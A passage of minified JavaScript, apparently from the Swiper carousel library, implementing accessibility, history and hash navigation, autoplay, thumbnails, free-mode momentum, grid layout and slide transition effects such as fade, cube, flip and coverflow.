        })), a("slidesLengthChange snapGridLengthChange slidesGridLengthChange", (() => {
            t.params.a11y.enabled && C()
        })), a("fromEdge toEdge afterInit lock unlock", (() => {
            t.params.a11y.enabled && function() {
                if (t.params.loop || t.params.rewind || !t.navigation) return;
                const {
                    $nextEl: e,
                    $prevEl: s
                } = t.navigation;
                s && s.length > 0 && (t.isBeginning ? (p(s), i(s)) : (m(s), o(s))), e && e.length > 0 && (t.isEnd ? (p(e), i(e)) : (m(e), o(e)))
            }()
        })), a("paginationUpdate", (() => {
            t.params.a11y.enabled && function() {
                const e = t.params.a11y;
                h() && t.pagination.bullets.each((s => {
                    const a = c(s);
                    t.params.pagination.clickable && (o(a), t.params.pagination.renderBullet || (l(a, "button"), u(a, e.paginationBulletMessage.replace(/\{\{index\}\}/, a.index() + 1)))), a.is(`.${t.params.pagination.bulletActiveClass}`) ? a.attr("aria-current", "true") : a.removeAttr("aria-current")
                }))
            }()
        })), a("destroy", (() => {
            t.params.a11y.enabled && function() {
                let e, s;
                n && n.length > 0 && n.remove(), t.navigation && t.navigation.$nextEl && (e = t.navigation.$nextEl), t.navigation && t.navigation.$prevEl && (s = t.navigation.$prevEl), e && e.off("keydown", f), s && s.off("keydown", f), g() && t.pagination.$el.off("keydown", W(t.params.pagination.bulletClass), f), t.$el.off("focus", w, !0), t.$el.off("pointerdown", v, !0), t.$el.off("pointerup", b, !0)
            }()
        }))
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            history: {
                enabled: !1,
                root: "",
                replaceState: !1,
                key: "slides",
                keepQuery: !1
            }
        });
        let n = !1,
            o = {};
        const i = e => e.toString().replace(/\s+/g, "-").replace(/[^\w-]+/g, "").replace(/--+/g, "-").replace(/^-+/, "").replace(/-+$/, ""),
            l = e => {
                const t = r();
                let s;
                s = e ? new URL(e) : t.location;
                const a = s.pathname.slice(1).split("/").filter((e => "" !== e)),
                    n = a.length;
                return {
                    key: a[n - 2],
                    value: a[n - 1]
                }
            },
            c = (e, s) => {
                const a = r();
                if (!n || !t.params.history.enabled) return;
                let o;
                o = t.params.url ? new URL(t.params.url) : a.location;
                const l = t.slides.eq(s);
                let c = i(l.attr("data-history"));
                if (t.params.history.root.length > 0) {
                    let s = t.params.history.root;
                    "/" === s[s.length - 1] && (s = s.slice(0, s.length - 1)), c = `${s}/${e}/${c}`
                } else o.pathname.includes(e) || (c = `${e}/${c}`);
                t.params.history.keepQuery && (c += o.search);
                const d = a.history.state;
                d && d.value === c || (t.params.history.replaceState ? a.history.replaceState({
                    value: c
                }, null, c) : a.history.pushState({
                    value: c
                }, null, c))
            },
            d = (e, s, a) => {
                if (s)
                    for (let n = 0, r = t.slides.length; n < r; n += 1) {
                        const r = t.slides.eq(n);
                        if (i(r.attr("data-history")) === s && !r.hasClass(t.params.slideDuplicateClass)) {
                            const s = r.index();
                            t.slideTo(s, e, a)
                        }
                    } else t.slideTo(0, e, a)
            },
            u = () => {
                o = l(t.params.url), d(t.params.speed, o.value, !1)
            };
        a("init", (() => {
            t.params.history.enabled && (() => {
                const e = r();
                if (t.params.history) {
                    if (!e.history || !e.history.pushState) return t.params.history.enabled = !1, void(t.params.hashNavigation.enabled = !0);
                    n = !0, o = l(t.params.url), (o.key || o.value) && (d(0, o.value, t.params.runCallbacksOnInit), t.params.history.replaceState || e.addEventListener("popstate", u))
                }
            })()
        })), a("destroy", (() => {
            t.params.history.enabled && (() => {
                const e = r();
                t.params.history.replaceState || e.removeEventListener("popstate", u)
            })()
        })), a("transitionEnd _freeModeNoMomentumRelease", (() => {
            n && c(t.params.history.key, t.activeIndex)
        })), a("slideChange", (() => {
            n && t.params.cssMode && c(t.params.history.key, t.activeIndex)
        }))
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            emit: n,
            on: o
        } = e, i = !1;
        const l = a(),
            d = r();
        s({
            hashNavigation: {
                enabled: !1,
                replaceState: !1,
                watchState: !1
            }
        });
        const u = () => {
                n("hashChange");
                const e = l.location.hash.replace("#", "");
                if (e !== t.slides.eq(t.activeIndex).attr("data-hash")) {
                    const s = t.$wrapperEl.children(`.${t.params.slideClass}[data-hash="${e}"]`).index();
                    if (void 0 === s) return;
                    t.slideTo(s)
                }
            },
            p = () => {
                if (i && t.params.hashNavigation.enabled)
                    if (t.params.hashNavigation.replaceState && d.history && d.history.replaceState) d.history.replaceState(null, null, `#${t.slides.eq(t.activeIndex).attr("data-hash")}` || ""), n("hashSet");
                    else {
                        const e = t.slides.eq(t.activeIndex),
                            s = e.attr("data-hash") || e.attr("data-history");
                        l.location.hash = s || "", n("hashSet")
                    }
            };
        o("init", (() => {
            t.params.hashNavigation.enabled && (() => {
                if (!t.params.hashNavigation.enabled || t.params.history && t.params.history.enabled) return;
                i = !0;
                const e = l.location.hash.replace("#", "");
                if (e) {
                    const s = 0;
                    for (let a = 0, n = t.slides.length; a < n; a += 1) {
                        const n = t.slides.eq(a);
                        if ((n.attr("data-hash") || n.attr("data-history")) === e && !n.hasClass(t.params.slideDuplicateClass)) {
                            const e = n.index();
                            t.slideTo(e, s, t.params.runCallbacksOnInit, !0)
                        }
                    }
                }
                t.params.hashNavigation.watchState && c(d).on("hashchange", u)
            })()
        })), o("destroy", (() => {
            t.params.hashNavigation.enabled && t.params.hashNavigation.watchState && c(d).off("hashchange", u)
        })), o("transitionEnd _freeModeNoMomentumRelease", (() => {
            i && p()
        })), o("slideChange", (() => {
            i && t.params.cssMode && p()
        }))
    }, function(e) {
        let t, {
            swiper: s,
            extendParams: n,
            on: r,
            emit: o
        } = e;

        function i() {
            if (!s.size) return s.autoplay.running = !1, void(s.autoplay.paused = !1);
            const e = s.slides.eq(s.activeIndex);
            let a = s.params.autoplay.delay;
            e.attr("data-swiper-autoplay") && (a = e.attr("data-swiper-autoplay") || s.params.autoplay.delay), clearTimeout(t), t = u((() => {
                let e;
                s.params.autoplay.reverseDirection ? s.params.loop ? (s.loopFix(), e = s.slidePrev(s.params.speed, !0, !0), o("autoplay")) : s.isBeginning ? s.params.autoplay.stopOnLastSlide ? c() : (e = s.slideTo(s.slides.length - 1, s.params.speed, !0, !0), o("autoplay")) : (e = s.slidePrev(s.params.speed, !0, !0), o("autoplay")) : s.params.loop ? (s.loopFix(), e = s.slideNext(s.params.speed, !0, !0), o("autoplay")) : s.isEnd ? s.params.autoplay.stopOnLastSlide ? c() : (e = s.slideTo(0, s.params.speed, !0, !0), o("autoplay")) : (e = s.slideNext(s.params.speed, !0, !0), o("autoplay")), (s.params.cssMode && s.autoplay.running || !1 === e) && i()
            }), a)
        }

        function l() {
            return void 0 === t && !s.autoplay.running && (s.autoplay.running = !0, o("autoplayStart"), i(), !0)
        }

        function c() {
            return !!s.autoplay.running && void 0 !== t && (t && (clearTimeout(t), t = void 0), s.autoplay.running = !1, o("autoplayStop"), !0)
        }

        function d(e) {
            s.autoplay.running && (s.autoplay.paused || (t && clearTimeout(t), s.autoplay.paused = !0, 0 !== e && s.params.autoplay.waitForTransition ? ["transitionend", "webkitTransitionEnd"].forEach((e => {
                s.$wrapperEl[0].addEventListener(e, m)
            })) : (s.autoplay.paused = !1, i())))
        }

        function p() {
            const e = a();
            "hidden" === e.visibilityState && s.autoplay.running && d(), "visible" === e.visibilityState && s.autoplay.paused && (i(), s.autoplay.paused = !1)
        }

        function m(e) {
            s && !s.destroyed && s.$wrapperEl && e.target === s.$wrapperEl[0] && (["transitionend", "webkitTransitionEnd"].forEach((e => {
                s.$wrapperEl[0].removeEventListener(e, m)
            })), s.autoplay.paused = !1, s.autoplay.running ? i() : c())
        }

        function f() {
            s.params.autoplay.disableOnInteraction ? c() : (o("autoplayPause"), d()), ["transitionend", "webkitTransitionEnd"].forEach((e => {
                s.$wrapperEl[0].removeEventListener(e, m)
            }))
        }

        function h() {
            s.params.autoplay.disableOnInteraction || (s.autoplay.paused = !1, o("autoplayResume"), i())
        }
        s.autoplay = {
            running: !1,
            paused: !1
        }, n({
            autoplay: {
                enabled: !1,
                delay: 3e3,
                waitForTransition: !0,
                disableOnInteraction: !0,
                stopOnLastSlide: !1,
                reverseDirection: !1,
                pauseOnMouseEnter: !1
            }
        }), r("init", (() => {
            s.params.autoplay.enabled && (l(), a().addEventListener("visibilitychange", p), s.params.autoplay.pauseOnMouseEnter && (s.$el.on("mouseenter", f), s.$el.on("mouseleave", h)))
        })), r("beforeTransitionStart", ((e, t, a) => {
            s.autoplay.running && (a || !s.params.autoplay.disableOnInteraction ? s.autoplay.pause(t) : c())
        })), r("sliderFirstMove", (() => {
            s.autoplay.running && (s.params.autoplay.disableOnInteraction ? c() : d())
        })), r("touchEnd", (() => {
            s.params.cssMode && s.autoplay.paused && !s.params.autoplay.disableOnInteraction && i()
        })), r("destroy", (() => {
            s.$el.off("mouseenter", f), s.$el.off("mouseleave", h), s.autoplay.running && c(), a().removeEventListener("visibilitychange", p)
        })), Object.assign(s.autoplay, {
            pause: d,
            run: i,
            start: l,
            stop: c
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            thumbs: {
                swiper: null,
                multipleActiveThumbs: !0,
                autoScrollOffset: 0,
                slideThumbActiveClass: "swiper-slide-thumb-active",
                thumbsContainerClass: "swiper-thumbs"
            }
        });
        let n = !1,
            r = !1;

        function o() {
            const e = t.thumbs.swiper;
            if (!e || e.destroyed) return;
            const s = e.clickedIndex,
                a = e.clickedSlide;
            if (a && c(a).hasClass(t.params.thumbs.slideThumbActiveClass)) return;
            if (null == s) return;
            let n;
            if (n = e.params.loop ? parseInt(c(e.clickedSlide).attr("data-swiper-slide-index"), 10) : s, t.params.loop) {
                let e = t.activeIndex;
                t.slides.eq(e).hasClass(t.params.slideDuplicateClass) && (t.loopFix(), t._clientLeft = t.$wrapperEl[0].clientLeft, e = t.activeIndex);
                const s = t.slides.eq(e).prevAll(`[data-swiper-slide-index="${n}"]`).eq(0).index(),
                    a = t.slides.eq(e).nextAll(`[data-swiper-slide-index="${n}"]`).eq(0).index();
                n = void 0 === s ? a : void 0 === a ? s : a - e < e - s ? a : s
            }
            t.slideTo(n)
        }

        function i() {
            const {
                thumbs: e
            } = t.params;
            if (n) return !1;
            n = !0;
            const s = t.constructor;
            if (e.swiper instanceof s) t.thumbs.swiper = e.swiper, Object.assign(t.thumbs.swiper.originalParams, {
                watchSlidesProgress: !0,
                slideToClickedSlide: !1
            }), Object.assign(t.thumbs.swiper.params, {
                watchSlidesProgress: !0,
                slideToClickedSlide: !1
            });
            else if (f(e.swiper)) {
                const a = Object.assign({}, e.swiper);
                Object.assign(a, {
                    watchSlidesProgress: !0,
                    slideToClickedSlide: !1
                }), t.thumbs.swiper = new s(a), r = !0
            }
            return t.thumbs.swiper.$el.addClass(t.params.thumbs.thumbsContainerClass), t.thumbs.swiper.on("tap", o), !0
        }

        function l(e) {
            const s = t.thumbs.swiper;
            if (!s || s.destroyed) return;
            const a = "auto" === s.params.slidesPerView ? s.slidesPerViewDynamic() : s.params.slidesPerView;
            let n = 1;
            const r = t.params.thumbs.slideThumbActiveClass;
            if (t.params.slidesPerView > 1 && !t.params.centeredSlides && (n = t.params.slidesPerView), t.params.thumbs.multipleActiveThumbs || (n = 1), n = Math.floor(n), s.slides.removeClass(r), s.params.loop || s.params.virtual && s.params.virtual.enabled)
                for (let e = 0; e < n; e += 1) s.$wrapperEl.children(`[data-swiper-slide-index="${t.realIndex+e}"]`).addClass(r);
            else
                for (let e = 0; e < n; e += 1) s.slides.eq(t.realIndex + e).addClass(r);
            const o = t.params.thumbs.autoScrollOffset,
                i = o && !s.params.loop;
            if (t.realIndex !== s.realIndex || i) {
                let n, r, l = s.activeIndex;
                if (s.params.loop) {
                    s.slides.eq(l).hasClass(s.params.slideDuplicateClass) && (s.loopFix(), s._clientLeft = s.$wrapperEl[0].clientLeft, l = s.activeIndex);
                    const e = s.slides.eq(l).prevAll(`[data-swiper-slide-index="${t.realIndex}"]`).eq(0).index(),
                        a = s.slides.eq(l).nextAll(`[data-swiper-slide-index="${t.realIndex}"]`).eq(0).index();
                    n = void 0 === e ? a : void 0 === a ? e : a - l == l - e ? s.params.slidesPerGroup > 1 ? a : l : a - l < l - e ? a : e, r = t.activeIndex > t.previousIndex ? "next" : "prev"
                } else n = t.realIndex, r = n > t.previousIndex ? "next" : "prev";
                i && (n += "next" === r ? o : -1 * o), s.visibleSlidesIndexes && s.visibleSlidesIndexes.indexOf(n) < 0 && (s.params.centeredSlides ? n = n > l ? n - Math.floor(a / 2) + 1 : n + Math.floor(a / 2) - 1 : n > l && s.params.slidesPerGroup, s.slideTo(n, e ? 0 : void 0))
            }
        }
        t.thumbs = {
            swiper: null
        }, a("beforeInit", (() => {
            const {
                thumbs: e
            } = t.params;
            e && e.swiper && (i(), l(!0))
        })), a("slideChange update resize observerUpdate", (() => {
            l()
        })), a("setTransition", ((e, s) => {
            const a = t.thumbs.swiper;
            a && !a.destroyed && a.setTransition(s)
        })), a("beforeDestroy", (() => {
            const e = t.thumbs.swiper;
            e && !e.destroyed && r && e.destroy()
        })), Object.assign(t.thumbs, {
            init: i,
            update: l
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            emit: a,
            once: n
        } = e;
        s({
            freeMode: {
                enabled: !1,
                momentum: !0,
                momentumRatio: 1,
                momentumBounce: !0,
                momentumBounceRatio: 1,
                momentumVelocityRatio: 1,
                sticky: !1,
                minimumVelocity: .02
            }
        }), Object.assign(t, {
            freeMode: {
                onTouchStart: function() {
                    const e = t.getTranslate();
                    t.setTranslate(e), t.setTransition(0), t.touchEventsData.velocities.length = 0, t.freeMode.onTouchEnd({
                        currentPos: t.rtl ? t.translate : -t.translate
                    })
                },
                onTouchMove: function() {
                    const {
                        touchEventsData: e,
                        touches: s
                    } = t;
                    0 === e.velocities.length && e.velocities.push({
                        position: s[t.isHorizontal() ? "startX" : "startY"],
                        time: e.touchStartTime
                    }), e.velocities.push({
                        position: s[t.isHorizontal() ? "currentX" : "currentY"],
                        time: p()
                    })
                },
                onTouchEnd: function(e) {
                    let {
                        currentPos: s
                    } = e;
                    const {
                        params: r,
                        $wrapperEl: o,
                        rtlTranslate: i,
                        snapGrid: l,
                        touchEventsData: c
                    } = t, d = p() - c.touchStartTime;
                    if (s < -t.minTranslate()) t.slideTo(t.activeIndex);
                    else if (s > -t.maxTranslate()) t.slides.length < l.length ? t.slideTo(l.length - 1) : t.slideTo(t.slides.length - 1);
                    else {
                        if (r.freeMode.momentum) {
                            if (c.velocities.length > 1) {
                                const e = c.velocities.pop(),
                                    s = c.velocities.pop(),
                                    a = e.position - s.position,
                                    n = e.time - s.time;
                                t.velocity = a / n, t.velocity /= 2, Math.abs(t.velocity) < r.freeMode.minimumVelocity && (t.velocity = 0), (n > 150 || p() - e.time > 300) && (t.velocity = 0)
                            } else t.velocity = 0;
                            t.velocity *= r.freeMode.momentumVelocityRatio, c.velocities.length = 0;
                            let e = 1e3 * r.freeMode.momentumRatio;
                            const s = t.velocity * e;
                            let d = t.translate + s;
                            i && (d = -d);
                            let u, m = !1;
                            const f = 20 * Math.abs(t.velocity) * r.freeMode.momentumBounceRatio;
                            let h;
                            if (d < t.maxTranslate()) r.freeMode.momentumBounce ? (d + t.maxTranslate() < -f && (d = t.maxTranslate() - f), u = t.maxTranslate(), m = !0, c.allowMomentumBounce = !0) : d = t.maxTranslate(), r.loop && r.centeredSlides && (h = !0);
                            else if (d > t.minTranslate()) r.freeMode.momentumBounce ? (d - t.minTranslate() > f && (d = t.minTranslate() + f), u = t.minTranslate(), m = !0, c.allowMomentumBounce = !0) : d = t.minTranslate(), r.loop && r.centeredSlides && (h = !0);
                            else if (r.freeMode.sticky) {
                                let e;
                                for (let t = 0; t < l.length; t += 1)
                                    if (l[t] > -d) {
                                        e = t;
                                        break
                                    } d = Math.abs(l[e] - d) < Math.abs(l[e - 1] - d) || "next" === t.swipeDirection ? l[e] : l[e - 1], d = -d
                            }
                            if (h && n("transitionEnd", (() => {
                                    t.loopFix()
                                })), 0 !== t.velocity) {
                                if (e = i ? Math.abs((-d - t.translate) / t.velocity) : Math.abs((d - t.translate) / t.velocity), r.freeMode.sticky) {
                                    const s = Math.abs((i ? -d : d) - t.translate),
                                        a = t.slidesSizesGrid[t.activeIndex];
                                    e = s < a ? r.speed : s < 2 * a ? 1.5 * r.speed : 2.5 * r.speed
                                }
                            } else if (r.freeMode.sticky) return void t.slideToClosest();
                            r.freeMode.momentumBounce && m ? (t.updateProgress(u), t.setTransition(e), t.setTranslate(d), t.transitionStart(!0, t.swipeDirection), t.animating = !0, o.transitionEnd((() => {
                                t && !t.destroyed && c.allowMomentumBounce && (a("momentumBounce"), t.setTransition(r.speed), setTimeout((() => {
                                    t.setTranslate(u), o.transitionEnd((() => {
                                        t && !t.destroyed && t.transitionEnd()
                                    }))
                                }), 0))
                            }))) : t.velocity ? (a("_freeModeNoMomentumRelease"), t.updateProgress(d), t.setTransition(e), t.setTranslate(d), t.transitionStart(!0, t.swipeDirection), t.animating || (t.animating = !0, o.transitionEnd((() => {
                                t && !t.destroyed && t.transitionEnd()
                            })))) : t.updateProgress(d), t.updateActiveIndex(), t.updateSlidesClasses()
                        } else {
                            if (r.freeMode.sticky) return void t.slideToClosest();
                            r.freeMode && a("_freeModeNoMomentumRelease")
                        }(!r.freeMode.momentum || d >= r.longSwipesMs) && (t.updateProgress(), t.updateActiveIndex(), t.updateSlidesClasses())
                    }
                }
            }
        })
    }, function(e) {
        let t, s, a, {
            swiper: n,
            extendParams: r
        } = e;
        r({
            grid: {
                rows: 1,
                fill: "column"
            }
        }), n.grid = {
            initSlides: e => {
                const {
                    slidesPerView: r
                } = n.params, {
                    rows: o,
                    fill: i
                } = n.params.grid;
                s = t / o, a = Math.floor(e / o), t = Math.floor(e / o) === e / o ? e : Math.ceil(e / o) * o, "auto" !== r && "row" === i && (t = Math.max(t, r * o))
            },
            updateSlide: (e, r, o, i) => {
                const {
                    slidesPerGroup: l,
                    spaceBetween: c
                } = n.params, {
                    rows: d,
                    fill: u
                } = n.params.grid;
                let p, m, f;
                if ("row" === u && l > 1) {
                    const s = Math.floor(e / (l * d)),
                        a = e - d * l * s,
                        n = 0 === s ? l : Math.min(Math.ceil((o - s * d * l) / d), l);
                    f = Math.floor(a / n), m = a - f * n + s * l, p = m + f * t / d, r.css({
                        "-webkit-order": p,
                        order: p
                    })
                } else "column" === u ? (m = Math.floor(e / d), f = e - m * d, (m > a || m === a && f === d - 1) && (f += 1, f >= d && (f = 0, m += 1))) : (f = Math.floor(e / s), m = e - f * s);
                r.css(i("margin-top"), 0 !== f ? c && `${c}px` : "")
            },
            updateWrapperSize: (e, s, a) => {
                const {
                    spaceBetween: r,
                    centeredSlides: o,
                    roundLengths: i
                } = n.params, {
                    rows: l
                } = n.params.grid;
                if (n.virtualSize = (e + r) * t, n.virtualSize = Math.ceil(n.virtualSize / l) - r, n.$wrapperEl.css({
                        [a("width")]: `${n.virtualSize+r}px`
                    }), o) {
                    s.splice(0, s.length);
                    const e = [];
                    for (let t = 0; t < s.length; t += 1) {
                        let a = s[t];
                        i && (a = Math.floor(a)), s[t] < n.virtualSize + s[0] && e.push(a)
                    }
                    s.push(...e)
                }
            }
        }
    }, function(e) {
        let {
            swiper: t
        } = e;
        Object.assign(t, {
            appendSlide: K.bind(t),
            prependSlide: Z.bind(t),
            addSlide: X.bind(t),
            removeSlide: Q.bind(t),
            removeAllSlides: ee.bind(t)
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            fadeEffect: {
                crossFade: !1,
                transformEl: null
            }
        }), te({
            effect: "fade",
            swiper: t,
            on: a,
            setTranslate: () => {
                const {
                    slides: e
                } = t, s = t.params.fadeEffect;
                for (let a = 0; a < e.length; a += 1) {
                    const e = t.slides.eq(a);
                    let n = -e[0].swiperSlideOffset;
                    t.params.virtualTranslate || (n -= t.translate);
                    let r = 0;
                    t.isHorizontal() || (r = n, n = 0);
                    const o = t.params.fadeEffect.crossFade ? Math.max(1 - Math.abs(e[0].progress), 0) : 1 + Math.min(Math.max(e[0].progress, -1), 0);
                    se(s, e).css({
                        opacity: o
                    }).transform(`translate3d(${n}px, ${r}px, 0px)`)
                }
            },
            setTransition: e => {
                const {
                    transformEl: s
                } = t.params.fadeEffect;
                (s ? t.slides.find(s) : t.slides).transition(e), ae({
                    swiper: t,
                    duration: e,
                    transformEl: s,
                    allSlides: !0
                })
            },
            overwriteParams: () => ({
                slidesPerView: 1,
                slidesPerGroup: 1,
                watchSlidesProgress: !0,
                spaceBetween: 0,
                virtualTranslate: !t.params.cssMode
            })
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            cubeEffect: {
                slideShadows: !0,
                shadow: !0,
                shadowOffset: 20,
                shadowScale: .94
            }
        });
        const n = (e, t, s) => {
            let a = s ? e.find(".swiper-slide-shadow-left") : e.find(".swiper-slide-shadow-top"),
                n = s ? e.find(".swiper-slide-shadow-right") : e.find(".swiper-slide-shadow-bottom");
            0 === a.length && (a = c(`<div class="swiper-slide-shadow-${s?"left":"top"}"></div>`), e.append(a)), 0 === n.length && (n = c(`<div class="swiper-slide-shadow-${s?"right":"bottom"}"></div>`), e.append(n)), a.length && (a[0].style.opacity = Math.max(-t, 0)), n.length && (n[0].style.opacity = Math.max(t, 0))
        };
        te({
            effect: "cube",
            swiper: t,
            on: a,
            setTranslate: () => {
                const {
                    $el: e,
                    $wrapperEl: s,
                    slides: a,
                    width: r,
                    height: o,
                    rtlTranslate: i,
                    size: l,
                    browser: d
                } = t, u = t.params.cubeEffect, p = t.isHorizontal(), m = t.virtual && t.params.virtual.enabled;
                let f, h = 0;
                u.shadow && (p ? (f = s.find(".swiper-cube-shadow"), 0 === f.length && (f = c('<div class="swiper-cube-shadow"></div>'), s.append(f)), f.css({
                    height: `${r}px`
                })) : (f = e.find(".swiper-cube-shadow"), 0 === f.length && (f = c('<div class="swiper-cube-shadow"></div>'), e.append(f))));
                for (let e = 0; e < a.length; e += 1) {
                    const t = a.eq(e);
                    let s = e;
                    m && (s = parseInt(t.attr("data-swiper-slide-index"), 10));
                    let r = 90 * s,
                        o = Math.floor(r / 360);
                    i && (r = -r, o = Math.floor(-r / 360));
                    const c = Math.max(Math.min(t[0].progress, 1), -1);
                    let d = 0,
                        f = 0,
                        g = 0;
                    s % 4 == 0 ? (d = 4 * -o * l, g = 0) : (s - 1) % 4 == 0 ? (d = 0, g = 4 * -o * l) : (s - 2) % 4 == 0 ? (d = l + 4 * o * l, g = l) : (s - 3) % 4 == 0 && (d = -l, g = 3 * l + 4 * l * o), i && (d = -d), p || (f = d, d = 0);
                    const y = `rotateX(${p?0:-r}deg) rotateY(${p?r:0}deg) translate3d(${d}px, ${f}px, ${g}px)`;
                    c <= 1 && c > -1 && (h = 90 * s + 90 * c, i && (h = 90 * -s - 90 * c)), t.transform(y), u.slideShadows && n(t, c, p)
                }
                if (s.css({
                        "-webkit-transform-origin": `50% 50% -${l/2}px`,
                        "transform-origin": `50% 50% -${l/2}px`
                    }), u.shadow)
                    if (p) f.transform(`translate3d(0px, ${r/2+u.shadowOffset}px, ${-r/2}px) rotateX(90deg) rotateZ(0deg) scale(${u.shadowScale})`);
                    else {
                        const e = Math.abs(h) - 90 * Math.floor(Math.abs(h) / 90),
                            t = 1.5 - (Math.sin(2 * e * Math.PI / 360) / 2 + Math.cos(2 * e * Math.PI / 360) / 2),
                            s = u.shadowScale,
                            a = u.shadowScale / t,
                            n = u.shadowOffset;
                        f.transform(`scale3d(${s}, 1, ${a}) translate3d(0px, ${o/2+n}px, ${-o/2/a}px) rotateX(-90deg)`)
                    } const g = d.isSafari || d.isWebView ? -l / 2 : 0;
                s.transform(`translate3d(0px,0,${g}px) rotateX(${t.isHorizontal()?0:h}deg) rotateY(${t.isHorizontal()?-h:0}deg)`), s[0].style.setProperty("--swiper-cube-translate-z", `${g}px`)
            },
            setTransition: e => {
                const {
                    $el: s,
                    slides: a
                } = t;
                a.transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e), t.params.cubeEffect.shadow && !t.isHorizontal() && s.find(".swiper-cube-shadow").transition(e)
            },
            recreateShadows: () => {
                const e = t.isHorizontal();
                t.slides.each((t => {
                    const s = Math.max(Math.min(t.progress, 1), -1);
                    n(c(t), s, e)
                }))
            },
            getEffectParams: () => t.params.cubeEffect,
            perspective: () => !0,
            overwriteParams: () => ({
                slidesPerView: 1,
                slidesPerGroup: 1,
                watchSlidesProgress: !0,
                resistanceRatio: 0,
                spaceBetween: 0,
                centeredSlides: !1,
                virtualTranslate: !0
            })
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            flipEffect: {
                slideShadows: !0,
                limitRotation: !0,
                transformEl: null
            }
        });
        const n = (e, s, a) => {
            let n = t.isHorizontal() ? e.find(".swiper-slide-shadow-left") : e.find(".swiper-slide-shadow-top"),
                r = t.isHorizontal() ? e.find(".swiper-slide-shadow-right") : e.find(".swiper-slide-shadow-bottom");
            0 === n.length && (n = ne(a, e, t.isHorizontal() ? "left" : "top")), 0 === r.length && (r = ne(a, e, t.isHorizontal() ? "right" : "bottom")), n.length && (n[0].style.opacity = Math.max(-s, 0)), r.length && (r[0].style.opacity = Math.max(s, 0))
        };
        te({
            effect: "flip",
            swiper: t,
            on: a,
            setTranslate: () => {
                const {
                    slides: e,
                    rtlTranslate: s
                } = t, a = t.params.flipEffect;
                for (let r = 0; r < e.length; r += 1) {
                    const o = e.eq(r);
                    let i = o[0].progress;
                    t.params.flipEffect.limitRotation && (i = Math.max(Math.min(o[0].progress, 1), -1));
                    const l = o[0].swiperSlideOffset;
                    let c = -180 * i,
                        d = 0,
                        u = t.params.cssMode ? -l - t.translate : -l,
                        p = 0;
                    t.isHorizontal() ? s && (c = -c) : (p = u, u = 0, d = -c, c = 0), o[0].style.zIndex = -Math.abs(Math.round(i)) + e.length, a.slideShadows && n(o, i, a);
                    const m = `translate3d(${u}px, ${p}px, 0px) rotateX(${d}deg) rotateY(${c}deg)`;
                    se(a, o).transform(m)
                }
            },
            setTransition: e => {
                const {
                    transformEl: s
                } = t.params.flipEffect;
                (s ? t.slides.find(s) : t.slides).transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e), ae({
                    swiper: t,
                    duration: e,
                    transformEl: s
                })
            },
            recreateShadows: () => {
                const e = t.params.flipEffect;
                t.slides.each((s => {
                    const a = c(s);
                    let r = a[0].progress;
                    t.params.flipEffect.limitRotation && (r = Math.max(Math.min(s.progress, 1), -1)), n(a, r, e)
                }))
            },
            getEffectParams: () => t.params.flipEffect,
            perspective: () => !0,
            overwriteParams: () => ({
                slidesPerView: 1,
                slidesPerGroup: 1,
                watchSlidesProgress: !0,
                spaceBetween: 0,
                virtualTranslate: !t.params.cssMode
            })
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            coverflowEffect: {
                rotate: 50,
                stretch: 0,
                depth: 100,
                scale: 1,
                modifier: 1,
                slideShadows: !0,
                transformEl: null
            }
        }), te({
            effect: "coverflow",
            swiper: t,
            on: a,
            setTranslate: () => {
                const {
                    width: e,
                    height: s,
                    slides: a,
                    slidesSizesGrid: n
                } = t, r = t.params.coverflowEffect, o = t.isHorizontal(), i = t.translate, l = o ? e / 2 - i : s / 2 - i, c = o ? r.rotate : -r.rotate, d = r.depth;
                for (let e = 0, t = a.length; e < t; e += 1) {
                    const t = a.eq(e),
                        s = n[e],
                        i = (l - t[0].swiperSlideOffset - s / 2) / s,
                        u = "function" == typeof r.modifier ? r.modifier(i) : i * r.modifier;
                    let p = o ? c * u : 0,
                        m = o ? 0 : c * u,
                        f = -d * Math.abs(u),
                        h = r.stretch;
                    "string" == typeof h && -1 !== h.indexOf("%") && (h = parseFloat(r.stretch) / 100 * s);
                    let g = o ? 0 : h * u,
                        y = o ? h * u : 0,
                        v = 1 - (1 - r.scale) * Math.abs(u);
                    Math.abs(y) < .001 && (y = 0), Math.abs(g) < .001 && (g = 0), Math.abs(f) < .001 && (f = 0), Math.abs(p) < .001 && (p = 0), Math.abs(m) < .001 && (m = 0), Math.abs(v) < .001 && (v = 0);
                    const b = `translate3d(${y}px,${g}px,${f}px)  rotateX(${m}deg) rotateY(${p}deg) scale(${v})`;
                    if (se(r, t).transform(b), t[0].style.zIndex = 1 - Math.abs(Math.round(u)), r.slideShadows) {
                        let e = o ? t.find(".swiper-slide-shadow-left") : t.find(".swiper-slide-shadow-top"),
                            s = o ? t.find(".swiper-slide-shadow-right") : t.find(".swiper-slide-shadow-bottom");
                        0 === e.length && (e = ne(r, t, o ? "left" : "top")), 0 === s.length && (s = ne(r, t, o ? "right" : "bottom")), e.length && (e[0].style.opacity = u > 0 ? u : 0), s.length && (s[0].style.opacity = -u > 0 ? -u : 0)
                    }
                }
            },
            setTransition: e => {
                const {
                    transformEl: s
                } = t.params.coverflowEffect;
                (s ? t.slides.find(s) : t.slides).transition(e).find(".swiper-slide-shadow-top, .swiper-slide-shadow-right, .swiper-slide-shadow-bottom, .swiper-slide-shadow-left").transition(e)
            },
            perspective: () => !0,
            overwriteParams: () => ({
                watchSlidesProgress: !0
            })
        })
    }, function(e) {
        let {
            swiper: t,
            extendParams: s,
            on: a
        } = e;
        s({
            creativeEffect: {
                transformEl: null,
                limitProgress: 1,
                shadowPerProgress: !1,
                progressMultiplier: 1,
                perspective: !0,
                prev: {
                    translate: [0, 0, 0],
                    rotate: [0, 0, 0],
                    opacity: 1,
                    scale: 1
